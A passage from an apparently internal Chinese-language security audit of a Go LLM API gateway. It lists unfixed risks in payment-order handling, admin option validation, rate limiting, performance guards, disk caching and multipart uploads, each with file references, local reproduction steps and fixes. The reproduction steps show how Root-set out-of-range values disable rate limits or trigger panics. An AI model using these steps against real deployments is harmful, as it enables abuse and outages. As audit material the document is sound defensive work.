  - `model/topup.go:164-188`：普通充值状态更新函数只提供单笔 pending -> failed/expired 的能力，没有按时间批量扫描入口。
  - `controller/topup_stripe.go:292-325`：Stripe 只有收到 `checkout.expired` 事件时才把订阅订单或普通充值标记 expired。
  - `controller/topup_waffo.go:376-389`：Waffo 只有收到非成功支付通知时才尝试把普通订单标记 failed。
  - `controller/subscription_payment_epay.go:79-103`：Epay 订阅只在下单创建失败时主动 expire，本轮未发现对已创建但长期未支付订单的定时过期。
  - `controller/subscription_payment_creem.go:80-119`：Creem 订阅先插入 pending，checkout 创建失败不标记 failed；该具体缺口已由风险 109 覆盖，但也说明缺少统一兜底清理。
  - 代码搜索未发现面向 `top_ups` 或 `subscription_orders` 的 `sweep/cleanup/expire pending orders` 类后台任务或 maintenance 接口。
- 可能后果：长期 pending 订单会堆积，普通用户 30 天后在自助账单中看不到老异常订单但数据库仍保留 pending；管理员需要依赖全表搜索或直接查库判断；客服可能把已不会完成的 pending 当作等待中订单，也可能误以为没有记录而让用户重复购买；支付平台补发迟到 success 时又可能与人工处理、失败标记或用户重复购买形成争议。
- 复现思路：本地创建一条 `top_ups.status='pending'` 或 `subscription_orders.status='pending'` 且 `create_time` 早于预期支付有效期的记录，不发送任何 provider webhook；启动应用并等待订阅维护任务运行，观察该订单不会被自动标记 expired/failed，也不会产生清理日志或告警。
- 修复建议：建立统一订单老化服务，例如 `PaymentOrderSweeper`，按 provider、订单类型、创建时间和外部 checkout TTL 计算安全过期窗口；只把超过保守窗口且仍 pending 的本地订单标记 expired，并记录结构化日志；对 provider 支持查询订单状态的场景，清理前先查询第三方状态；为清理任务增加 dry-run、批量大小、管理员可见报表和多实例互斥，避免误处理回调延迟但实际已支付的订单。
- 优先级：P1。
- 当前状态：未修复。

### 风险 174：本地支付订单缺少第三方 session/order/event/failure 持久化字段，对账和争议处理依赖日志散查

- 影响范围：普通充值、订阅支付、人工补单、支付争议、第三方后台对账、webhook 重放排查、长期 pending/failed 订单客服处理。
- 触发条件：支付创建成功但用户未完成支付、checkout 创建失败、第三方回调失败或迟到、用户提供第三方订单截图、支付平台后台只显示 session/order/event id，而本地数据库只保存内部 `trade_no`。
- 涉及文件/函数：
  - `model/topup.go:15-26`：普通充值 `TopUp` 只保存本地 `trade_no`、金额、支付方式、时间和状态，没有 provider session id、provider order id、webhook event id、失败原因、过期时间或原始 payload 摘要。
  - `model/subscription.go:203-217`：订阅订单有 `ProviderPayload`，但没有结构化 external id、event id、failure reason、expires_at 字段。
  - `model/subscription.go:612-684`：`ProviderPayload` 只在 `CompleteSubscriptionOrder` 成功完成时写入；pending、failed、expired 和 checkout 创建失败阶段没有持久化 provider payload。
  - `controller/topup_stripe.go:95-120`：Stripe 普通充值先创建 checkout session，再插入 `TopUp`，返回 `pay_link`；本地没有保存 Stripe session id、payment intent id 或 session 过期时间。
  - `controller/subscription_payment_stripe.go:74-101`：Stripe 订阅同样只保存本地 `referenceId`，不保存 checkout session id。
  - `controller/topup_creem.go:107-141`：Creem 普通充值创建本地 pending 后返回 `checkout_url/order_id`，本地只保存内部 request id；Creem order id 只在 webhook 日志中出现。
  - `controller/topup_creem.go:285-335`：Creem 成功回调对订阅会把完整 event 写入 `ProviderPayload`，但普通充值只查 `TopUp` 并继续入账，没有把 event id、Creem order id 或 payload 摘要写回订单。
  - `controller/topup.go:228-265` 与 `controller/topup.go:350-426`：Epay 普通充值的 purchase 参数和 verifyInfo 主要写日志，`TopUp` 不保存第三方交易号、验证 payload 或失败原因。
  - `controller/topup_waffo.go:195-290`：Waffo 把 `paymentRequestId` 与 `merchantOrderId` 设为内部订单号，外部创建响应和失败响应只写日志或返回前端，没有持久化 code/message/response。
  - `controller/topup_waffo_pancake.go:400-430`：Waffo Pancake checkout 返回 `session_id/expires_at/token_expires_at` 给前端并写 `session_id` 日志，但 `TopUp` 表不保存这些字段。
  - `controller/topup_waffo_pancake.go:470-536` 与 `service/waffo_pancake.go:45-52`、`service/waffo_pancake.go:177-193`：webhook event id、order id、金额、币种都在解析对象和日志中存在，普通充值完成时不落库；订阅完成时才把原始 body 写入 `ProviderPayload`。
- 可能后果：客服拿到第三方 session/order/event id 时无法直接在本地订单表检索；日志轮转或日志级别关闭后，订单创建失败原因、外部 session 过期时间和 webhook event id 丢失；重复 webhook、迟到 webhook、用户截图和 provider 对账单之间缺少可机读关联，补单时只能靠内部 `trade_no` 和人工比对，增加误补、漏补和争议处理成本。
- 复现思路：本地发起 Waffo Pancake 普通充值，接口响应包含 `session_id` 和 `expires_at`；查询 `top_ups` 仅能看到 `trade_no/status/create_time`，无法按 `session_id` 找回订单。再模拟普通充值 webhook，日志中有 `event_id/order_id`，但订单记录仍无对应字段。
- 修复建议：新增统一支付订单扩展字段或单独 `payment_order_events` 表，保存 `provider_session_id/provider_order_id/provider_event_id/provider_payload_hash/provider_payload_excerpt/failure_code/failure_message/expires_at/last_webhook_at`；普通充值和订阅支付共用同一写入策略；checkout 创建成功后立即保存 external id 和 expires_at，失败时保存 failure reason；webhook 处理时用 event id 建幂等索引并追加事件流水，避免只依赖文本日志。
- 优先级：P1。
- 当前状态：未修复。

### 风险 182：`DataExportInterval` 后端缺少范围校验，Root 可把数据看板导出协程打成无间隔循环

- 影响范围：Root 通用设置、数据看板、`quota_data` 周期落库、公开 rankings 数据源、节点 CPU、系统日志、主库写入压力和运维稳定性。
- 触发条件：Root 管理员、泄露的 Root session/access token，或配置导入/脚本直接调用 `PUT /api/option/`，把 `DataExportInterval` 写成 `0`、负数或非数字；`DataExportEnabled=true` 时，后台 `UpdateQuotaData` 循环继续运行。
- 涉及文件/函数：
  - `router/api-router.go:189-193`：`/api/option/` 使用 `RootAuth()`，Root 可直接更新任意通用 option。
  - `controller/option.go:120-139`：`UpdateOption` 将 JSON value 转成字符串；后续校验列表没有覆盖 `DataExportInterval`。
  - `controller/option.go:344-352`：校验结束后直接调用 `model.UpdateOption` 并返回成功。
  - `model/option.go:210-223`：`UpdateOption` 先保存 DB，再调用 `updateOptionMap` 热更新内存。
  - `model/option.go:532-533`：`DataExportInterval` 只执行 `strconv.Atoi(value)`，忽略错误，也没有 `>=1`、`<=1440` 等后端边界。
  - `main.go:100-104`：服务启动后后台常驻运行 `go model.UpdateQuotaData()`。
  - `model/usedata.go:24-31`：`UpdateQuotaData` 每轮在 `DataExportEnabled` 为 true 时调用 `SaveQuotaDataCache()`，然后 `time.Sleep(time.Duration(common.DataExportInterval) * time.Minute)`；当 interval 为 0 或负数时，Go 的 `time.Sleep` 会立即返回，循环没有退避。
  - `model/usedata.go:67-89`：每次循环都会拿 `CacheQuotaDataLock`，扫描并清空 `CacheQuotaData`，即使 size 为 0 也记录“保存数据看板数据成功”系统日志。
  - `web/default/src/features/system-settings/content/dashboard-section.tsx:53-55` 与 `web/default/src/features/system-settings/content/dashboard-section.tsx:125-142`：新版前端用 zod 和 number input 限制 `DataExportInterval` 为 1 到 1440，并提示过短会影响数据库负载。
  - `web/classic/src/pages/Setting/Dashboard/SettingsDataDashboard.jsx:127-139`：经典前端也设置 `min={1}`，但这些都是前端限制，不能防止直接 API 或导入写入异常值。
- 可能后果：`DataExportInterval=0` 或负数会让数据看板 goroutine 在单进程内持续无休眠循环，反复打印保存日志、抢 `CacheQuotaDataLock`、在有缓存时高频触发主库查询/更新。多实例部署时每个实例各自运行该循环，配置同步后可能同时放大 CPU、日志量和 DB 压力。`DataExportInterval=abc` 这类非数字会被 `Atoi` 错误吞掉，运行时值变成 0，同样触发无间隔循环；DB 中还会保存非法字符串，重启/同步后持续复现。
- 复现思路：在本地或测试环境以 Root 身份调用 `PUT /api/option/`，提交 `{"key":"DataExportInterval","value":0}` 或 `{"key":"DataExportInterval","value":"abc"}`；保持 `DataExportEnabled=true`；观察 `UpdateQuotaData` 协程不再按分钟 sleep，系统日志快速出现“保存数据看板数据成功”，节点 CPU/日志写入/DB 查询频率异常升高。
- 修复建议：在 `controller.UpdateOption` 或 `model.updateOptionMap` 对 `DataExportInterval` 做后端强校验，只接受整数且范围建议为 `1..1440`；`strconv.Atoi` 错误必须返回给调用方，不能吞掉。`UpdateQuotaData` 自身也应做防御性夹取，例如 `interval := max(common.DataExportInterval, 1)`，并对非法值写一次告警后退避。通用 option 更新建议补充 allowlist + 类型 schema，避免前端已限制、后端未限制的运行态配置继续出现。
- 优先级：P1。
- 当前状态：未修复。

### 风险 183：`monitor_setting.auto_test_channel_minutes` 后端缺少范围校验，异常周期会让自动渠道测试高频真实打上游并可能误禁用渠道

- 影响范围：自动渠道测试、真实上游模型调用、第三方额度成本、渠道响应时间统计、自动禁用/启用、系统日志、Root 配置入口和运营稳定性。
- 触发条件：Root 管理员、泄露的 Root session/access token，或配置导入/脚本直接调用 `PUT /api/option/`，将 `monitor_setting.auto_test_channel_enabled=true` 且 `monitor_setting.auto_test_channel_minutes` 写成 `0`、负数或小于 0.5 的小数；Master 节点后台 `AutomaticallyTestChannels` 正在运行。
- 涉及文件/函数：
  - `router/api-router.go:189-193`：`/api/option/` 使用 `RootAuth()`，Root 可更新分层配置项。
  - `controller/option.go:120-139`：`UpdateOption` 将任意 JSON value 转成字符串；没有针对 `monitor_setting.auto_test_channel_minutes` 做后端范围校验。
  - `controller/option.go:344-352`：校验结束后调用 `model.UpdateOption` 并返回成功。
  - `model/option.go:589-608`：`handleConfigUpdate` 识别 `monitor_setting.*` 后直接调用 `config.UpdateConfigFromMap`，没有检查或返回更新错误。
  - `setting/config/config.go:203-239`：分层配置通过反射解析 bool/int/float；float 字段只 `ParseFloat` 后 `SetFloat`，不检查业务范围。
  - `setting/config/config.go:280-283`：导出的 `UpdateConfigFromMap` 只是包装反射更新，没有 schema/validator。
  - `setting/operation_setting/monitor_setting.go:10-18`：`AutoTestChannelMinutes` 是 `float64`，默认 10 分钟。
  - `setting/operation_setting/monitor_setting.go:26-34`：环境变量 `CHANNEL_TEST_FREQUENCY` 只接受 `>0` 整数，这是正向证据；但后台 option 路径没有同等限制。
  - `controller/channel-test.go:986-1003`：自动测试只在 Master 节点运行；启用后读取 `AutoTestChannelMinutes`，执行 `time.Sleep(time.Duration(int(math.Round(frequency))) * time.Minute)`，随后调用 `testAllChannels(false)`。当 frequency 被四舍五入为 0 或为负数时，`time.Sleep` 会立即返回，循环没有退避。
  - `controller/channel-test.go:896-968`：`testAllChannels` 会遍历所有非手动禁用渠道并调用 `testChannel` 真实请求上游；根据错误和响应时间可能触发自动禁用/启用，并更新响应时间。
  - `controller/channel-test.go:902-908`：单实例互斥只阻止同一时间重复跑测试批次；自动测试外层仍会在异常周期下无休眠反复调用并记录日志，上一批完成后会立即启动下一批。
  - `web/default/src/features/system-settings/integrations/monitoring-settings-section.tsx:63-69` 与 `web/default/src/features/system-settings/integrations/monitoring-settings-section.tsx:281-309`：新版前端用 zod 和 number input 限制该周期为至少 1 分钟，但直接 API/导入不受前端限制。
- 可能后果：异常周期会让 Master 节点在后台持续高频触发全量渠道测试。由于渠道测试会真实调用上游且既有风险 170 已确认不进入统一 BillingSession/渠道成本统计，这会放大第三方额度消耗和内部账单口径缺口。若同时开启 `AutomaticDisableChannelEnabled` 或自动启用，短时间大量测试还可能因为瞬时网络抖动、上游限流或异常响应时间批量禁用/启用渠道，影响真实用户流量。即使 `testAllChannels` 互斥阻止并发测试，外层无间隔循环仍会刷系统日志并在上一批结束后立刻重新测试。
- 复现思路：在本地或测试环境以 Root 身份调用 `PUT /api/option/`，依次提交 `{"key":"monitor_setting.auto_test_channel_enabled","value":true}` 和 `{"key":"monitor_setting.auto_test_channel_minutes","value":0}` 或 `{"key":"monitor_setting.auto_test_channel_minutes","value":0.1}`；确认当前节点为 Master；观察日志中自动渠道测试循环快速触发，`testAllChannels` 在运行期间反复返回“测试已在运行中”但错误被忽略，批次结束后马上开始下一轮真实渠道测试。不要在生产真实付费渠道上做该复现。
- 修复建议：为分层配置引入后端 schema/validator，至少对 `monitor_setting.auto_test_channel_minutes` 强制整数且范围建议 `1..1440`；`handleConfigUpdate` 应返回 `UpdateConfigFromMap` 和 validator 错误并阻止 DB 保存。`AutomaticallyTestChannels` 也应做防御性夹取和退避：非法值使用默认 10 分钟并写一次告警；`testAllChannels` 返回错误时不要继续无间隔循环。自动渠道测试还应配置日预算、最小间隔、上游成本统计和自动禁用冷却窗口。
- 优先级：P1。
- 当前状态：未修复。

### 风险 184：模型请求限流标量字段缺少后端范围校验，异常窗口会让限流失效，异常计数还可能导致 500 或 panic

- 影响范围：`/v1` 和 `/v1beta` 模型 relay、模型请求限流、用户/分组限流策略、Redis 与内存限流器、滥用防护、上游成本控制、错误率和运营排障。
- 触发条件：Root 管理员、泄露的 Root session/access token，或配置导入/脚本直接调用 `PUT /api/option/`，在 `ModelRequestRateLimitEnabled=true` 时把 `ModelRequestRateLimitDurationMinutes` 写成 `0`、负数或非数字，或把 `ModelRequestRateLimitCount`、`ModelRequestRateLimitSuccessCount` 写成负数/非数字；随后用户通过 `/v1` 或 `/v1beta` 发起模型请求。
- 涉及文件/函数：
  - `router/relay-router.go:82-86` 与 `router/relay-router.go:202-206`：OpenAI 兼容 `/v1` 和 Gemini `/v1beta` relay 都在 `TokenAuth()` 后使用 `middleware.ModelRequestRateLimit()`。
  - `model/option.go:356-357`：`ModelRequestRateLimitEnabled` 可通过 option 热更新为 true。
  - `model/option.go:522-527`：`ModelRequestRateLimitCount`、`ModelRequestRateLimitDurationMinutes`、`ModelRequestRateLimitSuccessCount` 只做 `strconv.Atoi`，错误被忽略；没有非负、正数、上限或类型错误返回。
  - `middleware/model-rate-limit.go:166-198`：每个请求实时读取 `setting.ModelRequestRateLimitDurationMinutes` 计算 `duration := minutes * 60`，然后按 Redis/内存分支执行限流。
  - `middleware/model-rate-limit.go:24-61`：Redis 成功请求数限制中，`duration<=0` 时 `int64(subTime) < duration` 基本不会成立，达到上限后也会继续放行；`Expire` 使用原始分钟数，0/负数还会让 key 立即过期或行为异常。
  - `middleware/model-rate-limit.go:97-118`：Redis 总请求数限制把 `duration` 作为 token bucket 的 `requested`，容量为 `totalMaxCount*duration`；当 `duration=0` 时 Lua 脚本中 `requested=0`、`capacity=0`，`tokens >= requested` 成立，等同总请求限流放行。
  - `common/limiter/lua/rate_limit.lua:21-43`：Lua token bucket 没有对 `requested/rate/capacity` 做正数校验，`requested=0` 或负值会破坏“每次请求消耗令牌”的语义。
  - `middleware/model-rate-limit.go:131-162`：内存限流分支同样把 `duration` 传给 `InMemoryRateLimiter.Request`；`duration<=0` 时已满队列会立即滑动放行。
  - `common/rate-limit.go:14-25`：内存限流器只在首次 `Init` 且 `expirationDuration>0` 时启动清理协程；如果首次启用时窗口为 0/负数，不会有过期清理。
  - `common/rate-limit.go:44-70`：`Request` 没有校验 `maxRequestNum` 和 `duration`；`duration<=0` 会让 `now-old >= duration` 恒成立，负 `maxRequestNum` 还会在新 key 路径 `make([]int64, 0, maxRequestNum)` 触发 panic。
  - `middleware/model-rate-limit.go:24-47`：Redis 成功请求数分支遇到负 `successMaxCount` 时，空列表 `LLen=0` 不小于负数，随后 `LIndex -1` 的空结果被忽略并进入时间解析错误，返回 `rate_limit_check_failed`。
  - `web/default/src/features/system-settings/request-limits/rate-limit-section.tsx:67-73`：新版前端只限制 duration `min(0)`、请求数 `min(0)`、成功数 `min(1)`；其中 duration=0 在前端可提交，且直接 API 可绕过所有前端限制。
  - `setting/rate_limit.go:53-69` 与 `controller/option.go:271-279`：分组限流 JSON 有 `CheckModelRequestRateLimitGroup` 校验 `total>=0`、`success>=1` 和 `<= MaxInt32`，这是正向证据；但全局三个标量字段没有同级后端校验。
- 可能后果：运营以为已启用模型请求限流，但 `duration=0`、负数或非数字会让总请求数和成功请求数限制在 Redis/内存路径中基本失效，用户可以绕过用于控成本、防滥用和保护上游的限流策略。若把成功请求数或总请求数写成负数，Redis 路径可能持续返回 500，内存路径可能 panic 并由框架恢复为 500，直接影响所有模型请求。更隐蔽的是非数字会被 `Atoi` 吞掉并变成运行期 0，DB 中仍保留非法字符串，后续同步/重启会继续复现。
- 复现思路：在本地或测试环境启用 `ModelRequestRateLimitEnabled=true`，设置 `ModelRequestRateLimitCount=1`、`ModelRequestRateLimitSuccessCount=1`，再将 `ModelRequestRateLimitDurationMinutes=0`；连续用同一 token 调用 `/v1/chat/completions` 或 `/v1beta/models/...`，预期应第二次被限流，但实际 Redis/内存路径会继续放行。再单独测试 `ModelRequestRateLimitSuccessCount=-1`，观察 Redis 路径返回 `rate_limit_check_failed` 或内存路径发生异常。不要在生产环境用真实上游做压力复现。
- 修复建议：后端对三个标量字段建立和分组配置一致的强校验：`DurationMinutes` 应为正整数并设置合理上限，`Count` 应为 `0..MaxInt32`，`SuccessCount` 应为 `1..MaxInt32`；`strconv.Atoi` 错误必须返回给调用方，不允许静默使用旧值或 0。`ModelRequestRateLimit` 运行态也要做防御性兜底，发现非法值时应关闭本次配置并告警，或回退默认安全值。Redis Lua 与内存 limiter 应拒绝 `requested<=0/capacity<0/maxRequestNum<0/duration<=0`，避免配置错误变成绕过、500 或 panic。
- 优先级：P1。
- 当前状态：未修复。

### 风险 185：性能保护阈值后端缺少范围校验，异常值会静默关闭 relay 过载拦截或误拦正常请求

- 影响范围：`/v1`、`/v1beta`、playground、MJ/Suno 等 relay 路由，系统 CPU/内存/磁盘过载保护，Root 运维设置，节点稳定性，上游错误率和用户可用性。
- 触发条件：Root 管理员、泄露的 Root session/access token，或配置导入/脚本直接调用 `PUT /api/option/`，在 `performance_setting.monitor_enabled=true` 时把 `performance_setting.monitor_cpu_threshold`、`performance_setting.monitor_memory_threshold` 或 `performance_setting.monitor_disk_threshold` 写成 `0`、负数、超过 100 的值，或把阈值设置得极低。
- 涉及文件/函数：
  - `router/relay-router.go:75-86`：playground 和 `/v1` relay 在认证/分发前使用 `middleware.SystemPerformanceCheck()`。
  - `router/relay-router.go:181-206`：MJ、MJ mode、Suno、Gemini `/v1beta` 等 relay 路由同样挂载 `SystemPerformanceCheck()`。
  - `middleware/performance.go:40-70`：`checkSystemPerformance` 只在阈值 `>0` 且当前使用率大于阈值时返回 503；阈值 `<=0` 会关闭对应维度检查，阈值 `>100` 在百分比使用率场景下基本不会触发。
  - `setting/performance_setting/config.go:19-27`：CPU、内存、磁盘阈值是普通 `int` 字段，没有声明业务范围。
  - `setting/performance_setting/config.go:58-63`：`syncToCommon` 会把当前阈值直接同步到 `common.PerformanceMonitorConfig`。
  - `common/performance_config.go:25-32`：relay 中间件读取的是 atomic 保存的运行态配置，`SetPerformanceMonitorConfig` 不做范围校验。
  - `model/option.go:589-612`：分层配置更新后忽略 `config.UpdateConfigFromMap` 的返回错误，并对 `performance_setting` 立即调用 `UpdateAndSync()`，没有阻止非法阈值进入运行态。
  - `web/default/src/features/system-settings/maintenance/performance-section.tsx:72-86`：新版前端只给 CPU 阈值设置 `min(0)`，没有 `max(100)`；内存/磁盘前端有 `max(100)`，但直接 API 或配置导入仍可绕过。
  - `web/default/src/features/system-settings/maintenance/performance-section.tsx:438-480`：三个阈值输入都是普通 number input，后端才应作为最终可信边界。
- 可能后果：运营界面显示“性能监控已启用”，但某个阈值为 `0`、负数或超过 100 时，对应 CPU/内存/磁盘保护实际上失效；节点已经过载时 relay 仍继续接收请求，可能进一步放大延迟、502/504、上游失败和扣费后响应异常。相反，如果阈值被写成 `1` 这类极低值，正常负载也可能被 `SystemPerformanceCheck` 拒绝为 503，造成全站模型请求不可用。CPU 阈值没有前端上限，普通后台操作也可能保存 `1000` 这类永不触发的值。
- 复现思路：在本地或测试环境以 Root 身份保持 `performance_setting.monitor_enabled=true`，通过 `PUT /api/option/` 写入 `{"key":"performance_setting.monitor_cpu_threshold","value":0}` 或 `{"key":"performance_setting.monitor_memory_threshold","value":200}`；再观察运行态 `SystemPerformanceCheck` 对该维度不再触发。另将某个阈值设为 `1`，在正常使用率超过 1% 时访问 `/v1/chat/completions` 或 `/v1beta/models/...`，会被 503 拦截。不要在生产环境通过制造高 CPU/内存压力复现。
- 修复建议：为 `performance_setting` 增加后端 schema/validator，三个阈值都应强制为合理百分比范围，建议 `1..100`，如果需要“关闭某一维度”应使用显式布尔开关而不是 `0`/负数的隐式语义。`handleConfigUpdate` 应接住并返回 `UpdateConfigFromMap` 与 validator 错误，保存前拒绝非法值。`syncToCommon` 或 `SetPerformanceMonitorConfig` 也应做防御性夹取并记录告警，避免历史脏配置或导入数据直接污染运行态。前端 CPU 阈值应补齐 `max(100)`，并在保存时提示过低阈值会拒绝正常 relay 请求。
- 优先级：P1。
- 当前状态：未修复。

### 风险 186：磁盘缓存配置后端缺少范围和路径校验，异常值会让大请求内存保护失效、全量落盘或直接拒绝 relay 请求

- 影响范围：`/api` 与 relay 请求体读取、图片/音视频/base64 文件源缓存、Root 性能设置、节点内存、临时目录磁盘空间、模型请求可用性和运维排障。
- 触发条件：Root 管理员、泄露的 Root session/access token，或配置导入/脚本直接调用 `PUT /api/option/`，开启 `performance_setting.disk_cache_enabled=true` 后，将 `performance_setting.disk_cache_threshold_mb` 写成 `0`/负数/极大值，将 `performance_setting.disk_cache_max_size_mb` 写成 `0`/负数/过大值，或将 `performance_setting.disk_cache_path` 写成不可写、错误挂载、共享目录、备份目录或容量很小的路径。
- 涉及文件/函数：
  - `router/api-router.go:14-19` 与 `router/relay-router.go:13-17`：`/api` 与 relay 全局挂载 `middleware.BodyStorageCleanup()`，说明请求体和文件缓存是全局运行态能力。
  - `router/api-router.go:189-193`：`/api/option/` 只要求 RootAuth，Root 可写入 `performance_setting.*` 分层配置。
  - `controller/option.go:120-139` 与 `controller/option.go:344-352`：更新 option 时把任意 JSON value 转为字符串，校验后直接调用 `model.UpdateOption`；没有针对磁盘缓存阈值、最大容量或路径做后端校验。
  - `setting/config/config.go:203-222`：分层配置的 `int` 字段只做 `ParseInt/ParseFloat` 后 `SetInt`，不检查正数、上限、磁盘空间或路径安全。
  - `model/option.go:589-612`：分层配置更新后忽略 `config.UpdateConfigFromMap` 错误，并对 `performance_setting` 立即 `UpdateAndSync()`。
  - `setting/performance_setting/config.go:10-17` 与 `setting/performance_setting/config.go:50-56`：磁盘缓存开关、阈值、最大容量和路径都是普通字段，会直接同步到 `common.DiskCacheConfig`。
  - `common/disk_cache_config.go:50-62`：`ThresholdMB` 和 `MaxSizeMB` 直接左移转换为字节，没有校验 `<=0`、极大值或溢出。
  - `common/disk_cache_config.go:169-176`：`IsDiskCacheAvailable` 仅用内存原子计数 `currentUsage+requestSize <= maxBytes` 判断容量；`maxBytes<=0` 会让磁盘缓存静默不可用，极大值会放宽到接近无限。
  - `common/disk_cache.go:23-37`：缓存目录由管理员配置路径拼接 `new-api-body-cache`，`EnsureDiskCacheDir` 直接 `os.MkdirAll(..., 0755)`，没有 allowlist、可写性预检、磁盘空间预检或容器路径约束。
  - `common/disk_cache.go:166-175`：`ShouldUseDiskCache` 在 `dataSize < threshold` 时不使用磁盘；当 `threshold<=0` 时几乎所有文件/base64 缓存都会进入磁盘可用性判断。
  - `common/body_storage.go:261-281`：请求体流式读取在 `contentLength>=threshold` 且磁盘可用时直接创建磁盘存储；磁盘创建失败会返回错误，不能安全回退到内存。
  - `common/body_storage.go:283-302`：不满足磁盘条件时会读取到内存，最多到 `MAX_REQUEST_BODY_MB`，默认 128MB。
  - `common/gin.go:60-82`：relay 处理请求体时通过 `CreateBodyStorageFromReader` 读取和缓存请求体。
  - `service/file_service.go:196-217` 与 `service/file_service.go:356-369`：URL/base64 文件源在 `ShouldUseDiskCache` 为 true 时把 base64 字符串写入磁盘，否则保留在内存；磁盘写入失败时回退内存。
  - `types/file_source.go:209-229` 与 `middleware/body_cleanup.go:11-20`：正常请求结束会清理磁盘文件，这是正向证据；但异常退出、路径切换、手工清理窗口之外仍依赖后续旧文件清理。
  - `main.go:292-293` 与 `common/body_storage.go:311-315`：启动时只清理当前配置目录中超过 5 分钟的旧缓存；如果 `disk_cache_path` 已变更，旧路径残留不会被当前启动清理覆盖。
  - `controller/performance.go:142-155`：Root 手工清理仅删除当前缓存目录中超过 10 分钟的文件。
  - `web/default/src/features/system-settings/maintenance/performance-section.tsx:72-76`：新版前端限制阈值 `min(1)`、最大容量 `min(100)`，但直接 API/导入不受前端限制；路径只是不强制的字符串。
- 可能后果：运营开启磁盘缓存是为了避免大请求占用内存，但 `max_size_mb<=0` 会让所有大请求回退到内存，单请求仍可读取到默认 128MB，多个并发图片/音视频/base64 请求可能把节点内存推高；`threshold_mb<=0` 且最大容量较大时，几乎所有请求体和文件源都会落盘，带来高频小文件创建/删除、磁盘 IO 放大和敏感 prompt/base64 临时落盘；`max_size_mb` 极大或路径指向小磁盘时，内存计数无法代表真实磁盘空间，可能把临时目录写满，影响日志、数据库临时文件或同机其他服务。若路径不可写或指向错误挂载，带 `Content-Length` 且超过阈值的 relay 请求会在读取阶段直接失败，用户看到请求异常，而运营界面只显示“磁盘缓存已启用”。
- 复现思路：在本地或测试环境开启 `performance_setting.disk_cache_enabled=true`。将 `disk_cache_max_size_mb=-1` 后发送接近 `MAX_REQUEST_BODY_MB` 的图片/base64 请求，观察 `ShouldUseDiskCache` 不再使用磁盘而回退内存。将 `disk_cache_threshold_mb=0` 且 `disk_cache_max_size_mb` 设得较大，连续发送小请求，观察缓存目录出现大量 `body-*` 或 `file-*` 临时文件。再将 `disk_cache_path` 指向不可写目录并发送超过阈值且带 `Content-Length` 的 relay 请求，观察请求体读取失败。不要在生产环境用真实用户请求或共享磁盘做压力复现。
- 修复建议：为 `performance_setting.disk_cache_*` 增加后端 schema/validator：`threshold_mb` 建议 `1..MAX_REQUEST_BODY_MB`，`max_size_mb` 建议大于等于阈值且设置合理上限，并检查 `max_size_mb` 不超过当前可用磁盘空间的一定比例。路径应限制为绝对路径或空值，拒绝相对路径、敏感目录、公开静态目录和不可写目录；保存前创建测试文件并删除，失败则拒绝保存。运行态应对历史脏配置做夹取和告警，`CreateBodyStorageFromReader` 在创建文件失败但尚未消费 reader 时可以安全回退内存或返回明确的 503/配置错误。性能面板应显示“当前磁盘缓存是否实际可用”、最近一次写入错误、实际目录容量和路径变更后的旧目录清理提示。
- 优先级：P1。
- 当前状态：未修复。

### 风险 187：multipart 上传路径缺少统一临时文件清理和流式解析，大文件请求可堆积临时目录并重新放大内存占用

- 影响范围：OpenAI 兼容音频转写/翻译、图片编辑、任务类 multipart relay、Replicate/阿里/Cloudflare/Gemini/Sora/Jimeng 等适配器，系统临时目录，节点内存和磁盘空间，模型请求可用性。
- 触发条件：持有可用 API token 的用户或被泄露的 token，持续向 multipart relay 接口提交接近 `MAX_REQUEST_BODY_MB` 上限的文件表单；或运营把 `MAX_REQUEST_BODY_MB`/`MAX_FILE_DOWNLOAD_MB` 配得较大；请求走 `c.MultipartForm()`、`c.Request.FormFile()` 或 `common.ParseMultipartFormReusable()` 的路径。
- 涉及文件/函数：
  - `middleware/gzip.go:31-40` 与 `middleware/gzip.go:50-70`：压缩和非压缩请求都会被 `http.MaxBytesReader` 限制到 `MaxRequestBodyMB`，这是正向证据；风险不是完全无大小上限，而是上限内的 multipart 处理会产生临时文件和二次内存拷贝。
  - `common/gin.go:60-82`：`GetRequestBody` 将请求体读入 `BodyStorage`，默认 `MaxRequestBodyMB=128` MB。
  - `common/gin.go:108-145`：`UnmarshalBodyReusable` 对非磁盘 JSON 会调用 `storage.Bytes()`；multipart 分支再用 `parseMultipartFormData` 解析整个 `[]byte`。
  - `common/gin.go:255-291`：`ParseMultipartFormReusable` 先调用 `storage.Bytes()` 取出完整请求体，再 `multipart.NewReader(bytes.NewReader(requestBody), boundary)` 和 `ReadForm(multipartMemoryLimit())`；即使原始请求体已由磁盘缓存承载，这里也会把完整 multipart 请求重新读回内存。
  - `common/gin.go:324-345`：`parseMultipartFormData` 内部有 `defer form.RemoveAll()`，这是正向证据；但 `ParseMultipartFormReusable` 返回 form 给调用方，不在函数内清理。
  - `common/gin.go:377-383`：multipart 内存阈值使用 `MaxFileDownloadMB`，默认 64MB；超过阈值的文件部分可能由底层 multipart 实现落到系统临时目录。
  - `relay/helper/valid_request.go:141-155`：图片编辑 multipart 校验直接调用 `c.MultipartForm()`，没有在本地清理 `c.Request.MultipartForm`。
  - `relay/common/relay_utils.go:81-118` 与 `relay/common/relay_utils.go:198-210`：任务类 multipart 先调用 `c.MultipartForm()` 解析表单，随后又调用 `UnmarshalBodyReusable`；没有统一清理 `MultipartForm`。
  - `relay/channel/openai/adaptor.go:387-435`：音频 multipart 转发使用 `common.ParseMultipartFormReusable` 后复制文件到新的 multipart body，未看到 `formData.RemoveAll()`。
  - `relay/channel/openai/adaptor.go:451-528`：图片编辑路径复用或重新 `c.MultipartForm()`，逐个 `io.Copy` 上传文件，但没有统一 `MultipartForm.RemoveAll()`。
  - `relay/channel/ali/image.go:87-153`：阿里图片编辑路径通过 `c.MultipartForm()` 读取所有图片文件，再 `io.ReadAll` 和 base64 编码，缺少统一临时文件清理。
  - `relay/channel/replicate/adaptor.go:405-443`：Replicate 上传路径直接 `c.MultipartForm()` 并打开文件，没有看到请求结束时清理 multipart 临时文件。
  - `relay/channel/task/sora/adaptor.go:168-205`：Sora multipart 构造上游请求时使用 `ParseMultipartFormReusable`，会读取完整请求体并逐文件复制。
  - `relay/channel/task/jimeng/adaptor.go:133-166` 与 `relay/channel/task/gemini/image.go:18-42`：任务类图片上传路径直接 `c.MultipartForm()`，再读取文件到内存/base64。
  - `relay/channel/cloudflare/adaptor.go:84-90`：Cloudflare 音频路径使用 `c.Request.FormFile("file")`，同样依赖底层 multipart 解析。
  - `middleware/body_cleanup.go:11-20`：全局清理中间件只调用 `common.CleanupBodyStorage(c)` 和 `service.CleanupFileSources(c)`，没有调用 `c.Request.MultipartForm.RemoveAll()`。
